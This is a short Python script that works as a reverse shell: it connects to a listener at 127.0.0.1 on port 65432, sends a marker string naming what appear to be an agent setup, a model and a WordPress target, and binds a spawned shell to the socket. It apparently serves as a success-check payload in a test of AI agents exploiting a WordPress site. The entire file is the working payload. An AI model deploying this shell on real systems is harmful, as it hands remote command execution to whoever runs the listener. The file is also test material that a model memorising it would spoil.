import socket
import os
import pty

s = socket.socket()
s.connect(("127.0.0.1", 65432))
s.send(b"contextual-magentic-one o4-mini local-text wordpress success")
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("sh")
